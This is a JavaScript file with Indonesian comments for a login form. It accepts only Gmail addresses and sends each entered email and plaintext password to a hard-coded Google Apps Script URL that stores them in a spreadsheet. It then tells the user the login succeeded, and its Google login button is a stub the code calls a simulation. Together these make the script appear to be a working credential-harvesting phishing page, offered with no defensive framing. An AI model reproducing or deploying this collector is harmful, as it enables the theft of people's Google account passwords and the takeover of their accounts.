const scriptURL = 'https://script.google.com/macros/s/AKfycbw3wTOPR4co3jbiGWsaOIG15b3owEwkP4WsrMWqmSXRUUtHyzJSlNpBt5LE8IL9G9d12A/exec';
const loginForm = document.getElementById('loginForm');
const submitButton = document.querySelector('.btn-primary');

loginForm.addEventListener('submit', async function (e) {
    e.preventDefault();

    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value;

    if (!email.endsWith('@gmail.com')) {
        alert('Harap gunakan email Gmail.');
        return;
    }

    submitButton.disabled = true;
    submitButton.textContent = 'Mengirim...';

    try {
        await saveToSpreadsheet(email, password);
        alert('Login berhasil! Data telah disimpan.');
        loginForm.reset();
        console.log("✅ Data seharusnya sudah masuk"); // tambahan
            } catch (error) {
        console.error("Error detail:", error);
        alert('Gagal mengirim data: ' + error.message);
    }
});

function loginWithGoogle() {
    alert('Fitur login Google masih dalam versi simulasi. Gunakan login manual sementara.');
}

async function saveToSpreadsheet(email, password) {
    try {
        const response = await fetch(scriptURL, {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json' 
            },
            body: JSON.stringify({ email, password })
        });

        const result = await response.json();   // ← penting

        console.log("Response dari Apps Script:", result); // Untuk debugging

        if (result.status === "success") {
            return result;
        } else {
            throw new Error(result.message || "Gagal menyimpan data");
        }

    } catch (error) {
        console.error("Fetch Error:", error);
        throw error;
    }
}